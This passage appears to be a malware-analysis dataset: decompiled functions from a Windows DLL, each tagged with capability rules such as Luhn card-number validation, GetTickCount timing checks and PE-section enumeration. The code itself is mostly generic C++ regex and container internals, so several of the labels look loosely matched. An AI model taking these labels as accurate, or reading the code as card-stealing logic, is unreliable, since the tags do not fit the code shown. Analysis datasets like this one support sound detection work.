        "decompiled_code": "\nint32_t __fastcall fcn.10004190(int32_t *param_1)\n\n{\n    code **ppcVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x1002a9b0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h = 0;\n    ppcVar1 = fcn.1000ac95(0x18);\n    ppcVar1[4] = NULL;\n    ppcVar1[1] = 0xd;\n    ppcVar1[2] = NULL;\n    ppcVar1[3] = NULL;\n    *ppcVar1 = vtable.std::_Node_capture.0;\n    ppcVar1[5] = NULL;\n    ppcVar1[4] = param_1[10];\n    if (*(param_1[10] + 0xc) != NULL) {\n        ppcVar1[3] = *(param_1[10] + 0xc);\n        *(*(param_1[10] + 0xc) + 0x10) = ppcVar1;\n    }\n    *(param_1[10] + 0xc) = ppcVar1;\n    param_1[10] = ppcVar1;\n    fcn.10005650();\n    if (*param_1 != param_1[2]) {\n        fcn.1000a231(0xe);\n    }\n    fcn.100057f0(ppcVar1);\n    iVar2 = fcn.10005880();\n    *(iVar2 + 0x14) = param_1[0x10];\n    *(iVar2 + 0x1c) = param_1[3] + 1;\n    fcn.10001f80(0);\n    *in_FS_OFFSET = var_ch_2;\n    return iVar2;\n}\n",
        "token_count": 468
    },
    "100042b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100042b0(code **param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.std::_Node_class_wchar_t__class_std::regex_traits_wchar_t__.0;\n    pcVar2 = param_1[5];\n    while (pcVar2 != NULL) {\n        pcVar1 = *(pcVar2 + 0x10);\n        fcn.10010c08(*(pcVar2 + 0xc));\n        fcn.1000accd(pcVar2);\n        pcVar2 = pcVar1;\n    }\n    fcn.1000accd(param_1[6]);\n    pcVar2 = param_1[7];\n    if (pcVar2 != NULL) {\n        fcn.10010c08(*(pcVar2 + 8));\n        fcn.1000accd(pcVar2);\n    }\n    pcVar2 = param_1[8];\n    if (pcVar2 != NULL) {\n        fcn.10010c08(*(pcVar2 + 8));\n        fcn.1000accd(pcVar2);\n    }\n    pcVar2 = param_1[10];\n    while (pcVar2 != NULL) {\n        pcVar1 = *(pcVar2 + 0x10);\n        fcn.10010c08(*(pcVar2 + 0xc));\n        fcn.1000accd(pcVar2);\n        pcVar2 = pcVar1;\n    }\n    *param_1 = vtable.std::_Node_base.0;\n    return;\n}\n",
        "token_count": 347
    },
    "10004350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10004350(int32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = param_1[1] - *param_1 >> 3;\n    if (param_2 < uVar1) {\n        param_1[1] = param_1[1] + (param_2 - uVar1) * 8;\n        return;\n    }\n    if (uVar1 < param_2) {\n        fcn.100045b0(param_2 - uVar1);\n        fcn.10006fe0(param_1[1], unaff_retaddr);\n        param_1[1] = param_1[1] + (param_2 - (param_1[1] - *param_1 >> 3)) * 8;\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "10004470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.10004470(int32_t param_1, uint param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    \n    if (param_3 != 0xffff) {\n        if (**(param_1 + 4) == vtable.std::ctype_wchar_t_.0) {\n            uVar1 = fcn.1000a251(param_2);\n            return uVar1 & 0xffffff00 | (param_3 & uVar1) != 0;\n        }\n        uVar1 = (**(**(param_1 + 4) + 0x10))(param_3, param_2);\n        return uVar1;\n    }\n    if (param_2 != 0x5f) {\n        if (**(param_1 + 4) == vtable.std::ctype_wchar_t_.0) {\n            uVar1 = fcn.1000a251(param_2);\n            cVar2 = (uVar1 & 0x107) != 0;\n        }\n        else {\n            cVar2 = (**(**(param_1 + 4) + 0x10))(0x107, param_2);\n        }\n        if (cVar2 == '\\0') {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 296
    },
    "10004610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.10004610(int32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    int32_t iVar3;\n    uint unaff_retaddr;\n    \n    iVar3 = param_1[1] - *param_1;\n    iVar2 = iVar3 * 0x2aaaaaab;\n    uVar1 = iVar3 / 0xc;\n    if (param_2 < uVar1) {\n        iVar2 = param_1[1] + (param_2 - uVar1) * 0xc;\n        param_1[1] = iVar2;\n        return iVar2;\n    }\n    if (uVar1 < param_2) {\n        fcn.10004bb0(param_2 - uVar1);\n        fcn.10007010(extraout_ECX, unaff_retaddr);\n        iVar2 = (param_2 - (param_1[1] - *param_1) / 0xc) * 0xc;\n        param_1[1] = param_1[1] + iVar2;\n    }\n    return iVar2;\n}\n",
        "token_count": 266
    },
    "10004ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10004ac0(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t *extraout_ECX;\n    uint32_t *extraout_ECX_00;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    \n    if (param_2 == 0) {\n        uVar8 = 0;\n        puVar6 = param_1;\ncode_r0x10004b16:\n        fcn.100086c0(uVar8, puVar6, param_2, puVar6);\n        uVar1 = *param_1;\n        uVar2 = param_1[1];\n        if (uVar1 == 0) goto code_r0x10004b74;\n        uVar5 = param_1[2] - uVar1 >> 3;\n        if (0x1fffffff < uVar5) goto code_r0x10004b93;\n        uVar7 = uVar1;\n        if (uVar5 << 3 < 0x1000) {\ncode_r0x10004b6b:\n            fcn.1000acc8(uVar7);\ncode_r0x10004b74:\n            param_1[2] = uVar8 + param_2 * 8;\n            param_1[1] = uVar8 + (uVar2 - uVar1 >> 3) * 8;\n            *param_1 = uVar8;\n            return;\n        }\n        if ((uVar1 & 0x1f) != 0) goto code_r0x10004b98;\n        uVar7 = *(uVar1 - 4);\n        if (uVar1 <= uVar7) goto code_r0x10004b9d;\n        if (3 < uVar1 - uVar7) {\n            if (0x23 < uVar1 - uVar7) goto code_r0x10004ba7;\n            goto code_r0x10004b6b;\n        }\n    }\n    else {\n        if (param_2 < 0x20000000) {\n            uVar8 = param_2 * 8;\n            if (uVar8 < 0x1000) {\n                uVar8 = fcn.1000ac95(uVar8);\n                puVar6 = extraout_ECX_00;\n            }\n            else {\n                if (uVar8 + 0x23 <= uVar8) goto code_r0x10004b8e;\n                iVar4 = fcn.1000ac95(uVar8 + 0x23);\n                uVar8 = iVar4 + 0x23U & 0xffffffe0;\n                *(uVar8 - 4) = iVar4;\n                puVar6 = extraout_ECX;\n            }\n            goto code_r0x10004b16;\n        }\n        fcn.1000b73a();\ncode_r0x10004b8e:\n        fcn.1000b73a();\ncode_r0x10004b93:\n        fcn.10010ddf();\ncode_r0x10004b98:\n        fcn.10010ddf();\ncode_r0x10004b9d:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x10004ba7:\n    fcn.10010ddf();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 804
    },
    "10004d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.10004d30(uint32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (param_1 == 0) {\n        return 0;\n    }\n    if (param_1 < 0x20000000) {\n        param_1 = param_1 * 8;\n        if (param_1 < 0x1000) {\n            uVar3 = fcn.1000ac95(param_1);\n            return uVar3;\n        }\n        if (param_1 < param_1 + 0x23) {\n            iVar2 = fcn.1000ac95(param_1 + 0x23);\n            uVar3 = iVar2 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar2;\n            return uVar3;\n        }\n    }\n    else {\n        fcn.1000b73a();\n    }\n    fcn.1000b73a();\n    pcVar1 = swi(3);\n    uVar3 = (*pcVar1)();\n    return uVar3;\n}\n",
        "token_count": 257
    },
    "10004d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10004d90(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t *extraout_ECX;\n    uint32_t *extraout_ECX_00;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    \n    uVar4 = param_2;\n    if (param_2 == 0) {\n        uVar7 = 0;\n        puVar6 = param_1;\n    }\n    else {\n        if (0x15555555 < param_2) {\n            fcn.1000b73a();\ncode_r0x10004e5e:\n            fcn.1000b73a();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        uVar7 = param_2 * 0xc;\n        if (uVar7 < 0x1000) {\n            uVar7 = fcn.1000ac95(uVar7);\n            puVar6 = extraout_ECX_00;\n        }\n        else {\n            if (uVar7 + 0x23 <= uVar7) goto code_r0x10004e5e;\n            iVar5 = fcn.1000ac95(uVar7 + 0x23);\n            uVar7 = iVar5 + 0x23U & 0xffffffe0;\n            *(uVar7 - 4) = iVar5;\n            puVar6 = extraout_ECX;\n        }\n    }\n    param_2 = param_2 & 0xffffff00;\n    fcn.10008780(uVar7, puVar6, param_2, puVar6);\n    uVar1 = param_1[1];\n    uVar2 = *param_1;\n    if (*param_1 != 0) {\n        fcn.10002660(*param_1, (param_1[2] - *param_1) / 0xc);\n    }\n    param_1[2] = uVar7 + uVar4 * 0xc;\n    param_1[1] = uVar7 + ((uVar1 - uVar2) / 0xc) * 0xc;\n    *param_1 = uVar7;\n    return;\n}\n",
        "token_count": 533
    },
    "10004e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10004e70(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint unaff_retaddr;\n    \n    uVar1 = param_1[1];\n    uVar2 = *param_1;\n    uVar3 = uVar1 - uVar2 >> 2;\n    if (param_2 < uVar3) {\n        param_1[1] = uVar1 + (param_2 - uVar3) * 4;\n        return;\n    }\n    if (uVar3 < param_2) {\n        if ((param_3 < uVar1) && (uVar2 <= param_3)) {\n            fcn.10004f00(param_2 - uVar3);\n            param_3 = *param_1 + (param_3 - uVar2 >> 2) * 4;\n        }\n        else {\n            fcn.10004f00(param_2 - uVar3);\n        }\n        fcn.10005cb0(param_3, param_1[1], unaff_retaddr);\n        param_1[1] = param_1[1] + (param_2 - (param_1[1] - *param_1 >> 2)) * 4;\n    }\n    return;\n}\n",
        "token_count": 314
    },
    "10004f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10004f60(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (param_2 == 0) {\n        uVar7 = 0;\ncode_r0x10004fb5:\n        fcn.1000bc90(uVar7, *param_1, param_1[1] - *param_1);\n        uVar1 = *param_1;\n        uVar2 = param_1[1];\n        if (uVar1 == 0) goto code_r0x10005012;\n        uVar5 = param_1[2] - uVar1 >> 2;\n        if (0x3fffffff < uVar5) goto code_r0x10005031;\n        uVar6 = uVar1;\n        if (uVar5 << 2 < 0x1000) {\ncode_r0x10005009:\n            fcn.1000acc8(uVar6);\ncode_r0x10005012:\n            param_1[2] = uVar7 + param_2 * 4;\n            param_1[1] = uVar7 + (uVar2 - uVar1 >> 2) * 4;\n            *param_1 = uVar7;\n            return;\n        }\n        if ((uVar1 & 0x1f) != 0) goto code_r0x10005036;\n        uVar6 = *(uVar1 - 4);\n        if (uVar1 <= uVar6) goto code_r0x1000503b;\n        if (3 < uVar1 - uVar6) {\n            if (0x23 < uVar1 - uVar6) goto code_r0x10005045;\n            goto code_r0x10005009;\n        }\n    }\n    else {\n        if (param_2 < 0x40000000) {\n            uVar7 = param_2 * 4;\n            if (uVar7 < 0x1000) {\n                uVar7 = fcn.1000ac95(uVar7);\n            }\n            else {\n                if (uVar7 + 0x23 <= uVar7) goto code_r0x1000502c;\n                iVar4 = fcn.1000ac95(uVar7 + 0x23);\n                uVar7 = iVar4 + 0x23U & 0xffffffe0;\n                *(uVar7 - 4) = iVar4;\n            }\n            goto code_r0x10004fb5;\n        }\n        fcn.1000b73a();\ncode_r0x1000502c:\n        fcn.1000b73a();\ncode_r0x10005031:\n        fcn.10010ddf();\ncode_r0x10005036:\n        fcn.10010ddf();\ncode_r0x1000503b:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x10005045:\n    fcn.10010ddf();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 731
    },
    "100054a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100054a0(int32_t *param_1)\n\n{\n    ushort uVar1;\n    uint16_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if (*param_1 == param_1[2]) {\n        param_1[0x13] = -1;\n        *(param_1 + 0x12) = 0xffff;\n    }\n    else {\n        uVar1 = **param_1;\n        *(param_1 + 0x12) = uVar1;\n        iVar4 = fcn.1000cfb0(\"()$^.*+?[]|\\\\-{},:=!\\n\\r\\b\", uVar1);\n        if (iVar4 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = *(param_1 + 0x12);\n        }\n        param_1[0x13] = uVar5;\n    }\n    switch(*(param_1 + 0x12)) {\n    case 10:\n        if ((*(param_1 + 0x14) & 4) == 0) {\n            return;\n        }\n        if (param_1[4] != 0) {\n            return;\n        }\n        param_1[0x13] = 0x7c;\n        return;\n    default:\n        goto code_r0x100055a9;\n    case 0x24:\n        if ((param_1[0x14] & 0x2000000U) == 0) {\n            return;\n        }\n        if (*param_1 + 2 == param_1[2]) {\n            return;\n        }\n        if (*(*param_1 + 2) == 10) {\n            return;\n        }\n        param_1[0x13] = 0;\n        return;\n    case 0x28:\n    case 0x29:\n        bVar6 = (*(param_1 + 0x14) & 8) == 0;\n        break;\n    case 0x2a:\n        if ((param_1[0x14] & 0x4000000U) == 0) {\n            return;\n        }\n        cVar3 = fcn.10006a70();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        param_1[0x13] = 0;\n        return;\n    case 0x2b:\n    case 0x3f:\n        bVar6 = (*(param_1 + 0x14) & 1) == 0;\n        break;\n    case 0x5c:\n        cVar3 = fcn.10006760();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        uVar2 = *(*param_1 + 2);\n        *(param_1 + 0x12) = uVar2;\n        param_1[0x13] = uVar2;\n        return;\n    case 0x5e:\n        if ((param_1[0x14] & 0x2000000U) == 0) {\n            return;\n        }\n        cVar3 = fcn.10006a70();\n        bVar6 = cVar3 == '\\0';\n        break;\n    case 0x7b:\n    case 0x7d:\n        bVar6 = (*(param_1 + 0x14) & 0x10) == 0;\n        break;\n    case 0x7c:\n        bVar6 = (*(param_1 + 0x14) & 2) == 0;\n    }\n    if (bVar6) {\n        param_1[0x13] = 0;\n    }\ncode_r0x100055a9:\n    return;\n}\n",
        "token_count": 845
    },
    "10005650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10005650(int16_t **param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int16_t *piVar3;\n    code **ppcVar4;\n    \n    piVar3 = param_1[10];\n    cVar1 = fcn.100067f0();\n    if (cVar1 == '\\0') {\n        if (param_1[0x13] != 0x7c) {\n            return;\n        }\n        uVar2 = fcn.10006ab0();\n        fcn.100057f0(uVar2);\n    }\n    fcn.10006b10(piVar3);\n    piVar3 = param_1[0x13];\n    while (piVar3 == 0x7c) {\n        piVar3 = *param_1;\n        if (piVar3 != param_1[2]) {\n            if (((*piVar3 == 0x5c) && (piVar3 = piVar3 + 1,  piVar3 != param_1[2])) &&\n               ((((param_1[0x14] & 8) == 0 && ((*piVar3 == 0x28 || (*piVar3 == 0x29)))) ||\n                (((param_1[0x14] & 0x10) == 0 && ((*piVar3 == 0x7b || (*piVar3 == 0x7d)))))))) {\n                *param_1 = piVar3;\n            }\n            *param_1 = *param_1 + 1;\n        }\n        fcn.100054a0();\n        cVar1 = fcn.100067f0();\n        if (cVar1 == '\\0') {\n            ppcVar4 = fcn.1000ac95(0x14);\n            ppcVar4[4] = NULL;\n            *ppcVar4 = vtable.std::_Node_base.0;\n            ppcVar4[1] = 0x8;\n            ppcVar4[2] = NULL;\n            ppcVar4[3] = NULL;\n            ppcVar4[4] = param_1[10];\n            if (*(param_1[10] + 6) != NULL) {\n                ppcVar4[3] = *(param_1[10] + 6);\n                *(*(param_1[10] + 6) + 0x10) = ppcVar4;\n            }\n            *(param_1[10] + 6) = ppcVar4;\n            param_1[10] = ppcVar4;\n            fcn.100057f0(ppcVar4);\n        }\n        fcn.10006bd0();\n        piVar3 = param_1[0x13];\n    }\n    return;\n}\n",
        "token_count": 615
    },
    "10005770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.10005770(uint *param_1, uint param_2)\n\n{\n    code **ppcVar1;\n    \n    ppcVar1 = fcn.1000ac95(0x24);\n    ppcVar1[1] = 0x14;\n    ppcVar1[2] = NULL;\n    ppcVar1[3] = NULL;\n    ppcVar1[4] = NULL;\n    *ppcVar1 = vtable.std::_Root_node.0;\n    ppcVar1[6] = NULL;\n    ppcVar1[7] = NULL;\n    ppcVar1[8] = NULL;\n    *param_1 = ppcVar1;\n    param_1[1] = ppcVar1;\n    param_1[3] = param_2;\n    param_1[2] = 1;\n    param_1[4] = 0x100;\n    param_1[5] = 4;\n    return param_1;\n}\n",
        "token_count": 225
    },
    "10005880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.10005880(uint *param_1)\n\n{\n    code **ppcVar1;\n    \n    ppcVar1 = fcn.1000ac95(0x14);\n    ppcVar1[4] = NULL;\n    *ppcVar1 = vtable.std::_Node_base.0;\n    ppcVar1[1] = 0x15;\n    ppcVar1[2] = NULL;\n    ppcVar1[3] = NULL;\n    ppcVar1[4] = param_1[1];\n    if (*(param_1[1] + 0xc) != NULL) {\n        ppcVar1[3] = *(param_1[1] + 0xc);\n        *(*(param_1[1] + 0xc) + 0x10) = ppcVar1;\n    }\n    *(param_1[1] + 0xc) = ppcVar1;\n    param_1[1] = ppcVar1;\n    return *param_1;\n}\n",
        "token_count": 229
    },
    "100058e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.100058e0(uint *param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint32_t param_6)\n\n{\n    uint *puVar1;\n    \n    *param_1 = param_3;\n    if ((param_6 & 0x100) != 0) {\n        puVar1 = fcn.10006cf0(param_2, param_3, param_4, param_5);\n        *param_1 = *puVar1;\n        return param_1;\n    }\n    if ((param_6 & 0x800) != 0) {\n        puVar1 = fcn.10006db0(param_2, param_3, param_4, param_5);\n        *param_1 = *puVar1;\n        return param_1;\n    }\n    puVar1 = fcn.10006e20(param_2, param_3, param_4, param_3);\n    *param_1 = *puVar1;\n    return param_1;\n}\n",
        "token_count": 239
    },
    "10005960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t ** __fastcall fcn.10005960(int16_t **param_1, uint32_t *param_2, int16_t *param_3, int16_t *param_4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    int16_t *piVar5;\n    uint32_t uStack12;\n    uint32_t *puStack8;\n    \n    puStack8 = param_2;\n    if (param_2 != NULL) {\n        do {\n            uStack12 = 0;\n            if (puStack8[2] != 0) {\n                uVar2 = *puStack8;\n                do {\n                    uVar4 = 0;\n                    piVar3 = param_3;\n                    if (uVar2 != 0) {\n                        piVar5 = puStack8[3] + uStack12 * 2;\n                        do {\n                            iVar1 = *piVar3;\n                            piVar3 = piVar3 + 1;\n                            if (iVar1 != *piVar5) break;\n                            uVar4 = uVar4 + 1;\n                            piVar5 = piVar5 + 1;\n                        } while (uVar4 < uVar2);\n                    }\n                    if (piVar3 == param_4) {\n                        *param_1 = param_4;\n                        return param_1;\n                    }\n                    uStack12 = uStack12 + uVar2;\n                } while (uStack12 < puStack8[2]);\n            }\n            puStack8 = puStack8[4];\n        } while (puStack8 != NULL);\n    }\n    *param_1 = param_3;\n    return param_1;\n}\n",
        "token_count": 383
    },
    "10005a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.10005a00(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    uint16_t in_CX;\n    int32_t *arg_ch;\n    int32_t *piVar4;\n    int32_t *in_EDX;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_ch_00;\n    uint var_60h;\n    uint var_5ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_34h;\n    uint32_t var_30h;\n    int32_t *var_2ch;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x1002aa1c;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_18h = 0x7;\n    var_1ch = NULL;\n    var_2ch = var_2ch & 0xffff0000;\n    var_30h = 7;\n    var_34h = 1;\n    var_44h = in_CX;\n    var_4h = 1;\n    arg_ch_00 = &var_44h;\n    puVar1 = fcn.10006e80(&var_5ch, arg_ch_00, &var_44h + 2);\n    if (&var_44h != puVar1) {\n        if (7 < var_30h) {\n            fcn.100026c0(var_44h, var_30h + 1);\n        }\n        var_30h = 7;\n        var_34h = 0;\n        var_44h = var_44h & 0xffff0000;\n        fcn.10002f80(puVar1);\n    }\n    var_4h._0_1_ = 1;\n    if (7 < var_48h) {\n        fcn.100026c0(var_5ch, var_48h + 1);\n    }\n    if (in_EDX != NULL) {\n        do {\n            uVar5 = 0;\n            if (in_EDX[2] != 0) {\n                do {\n                    arg_ch_00 = *in_EDX;\n                    fcn.100022c0(in_EDX[3] + uVar5 * 2);\n                    piVar4 = &var_2ch;\n                    if (0x7 < var_18h) {\n                        piVar4 = var_2ch;\n                    }\n                    arg_ch = &var_2ch;\n                    if (0x7 < var_18h) {\n                        arg_ch = var_2ch;\n                    }\n                    ppiVar2 = fcn.10006e80(&var_5ch, arg_ch, piVar4 + var_1ch * 2);\n                    var_4h._0_1_ = 3;\n                    if (&var_2ch != ppiVar2) {\n                        if (0x7 < var_18h) {\n                            if ((0x7fffffff < var_18h + 1U) ||\n                               ((piVar4 = var_2ch,  0xfff < (var_18h + 1U) * 2 &&\n                                (((((var_2ch & 0x1f) != 0 || (piVar4 = var_2ch[-1],  var_2ch <= piVar4)) ||\n                                  (var_2ch - piVar4 < 4)) || (0x23 < var_2ch - piVar4)))))) {\n                                fcn.10010ddf();\n                                goto code_r0x10005c22;\n                            }\n                            fcn.1000acc8(piVar4);\n                        }\n                        var_18h = 0x7;\n                        var_1ch = NULL;\n                        var_2ch = var_2ch & 0xffff0000;\n                        if (ppiVar2[5] < 0x8) {\n                            if (ppiVar2[4] + 1 != 0) {\n                                fcn.1000bc90(&var_2ch, ppiVar2, (ppiVar2[4] + 1) * 2);\n                            }\n                        }\n                        else {\n                            var_2ch = *ppiVar2;\n                            *ppiVar2 = NULL;\n                        }\n                        var_1ch = ppiVar2[4];\n                        var_18h = ppiVar2[5];\n                        ppiVar2[5] = 0x7;\n                        ppiVar2[4] = NULL;\n                        if (0x7 < ppiVar2[5]) {\n                            ppiVar2 = *ppiVar2;\n                        }\n                        *ppiVar2 = 0;\n                    }\n                    var_4h._0_1_ = 1;\n                    if (7 < var_48h) {\n                        fcn.100026c0();\n                    }\n                    iVar3 = fcn.100071e0();\n                    if (iVar3 == 0) goto code_r0x10005c22;\n                    uVar5 = uVar5 + *in_EDX;\n                } while (uVar5 < in_EDX[2]);\n            }\n            in_EDX = in_EDX[4];\n        } while (in_EDX != NULL);\n    }\ncode_r0x10005c22:\n    if (7 < var_30h) {\n        fcn.100026c0(var_44h, var_30h + 1);\n    }\n    var_30h = 7;\n    var_34h = 0;\n    var_44h = var_44h & 0xffff0000;\n    if (0x7 < var_18h) {\n        fcn.100026c0(var_2ch, var_18h + 1);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.1000ac84(arg_ch_00);\n    return;\n}\n",
        "token_count": 1384
    },
    "10005c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10005c90(ulong *param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        do {\n            if (param_1 != NULL) {\n                *param_1 = 0;\n            }\n            param_1 = param_1 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "10005cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10005cb0(uint *param_1, int32_t param_2, uint *param_3)\n\n{\n    if (param_2 != 0) {\n        do {\n            if (param_1 != NULL) {\n                *param_1 = *param_3;\n            }\n            param_1 = param_1 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "10005d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.10005d20(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (param_1 != param_2) {\n        iVar5 = *param_2;\n        iVar1 = param_2[1];\n        if (iVar5 == iVar1) {\n            param_1[1] = *param_1;\n            return param_1;\n        }\n        iVar2 = *param_1;\n        uVar7 = iVar1 - iVar5 >> 3;\n        uVar6 = param_1[1] - iVar2 >> 3;\n        if (uVar7 <= uVar6) {\n            fcn.1000bc90(iVar2, iVar5, iVar1 - iVar5);\n            param_1[1] = *param_1 + (param_2[1] - *param_2 >> 3) * 8;\n            return param_1;\n        }\n        uVar4 = param_1[2] - iVar2 >> 3;\n        if (uVar4 < uVar7) {\n            if (iVar2 != 0) {\n                fcn.100038c0(iVar2, uVar4);\n            }\n            cVar3 = fcn.10005df0(param_2[1] - *param_2 >> 3);\n            if (cVar3 == '\\0') {\n                return param_1;\n            }\n        }\n        else {\n            fcn.1000bc90(iVar2, iVar5, uVar6 * 8);\n        }\n        iVar5 = fcn.100086c0();\n        param_1[1] = iVar5;\n    }\n    return param_1;\n}\n",
        "token_count": 426
    },
    "10005e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
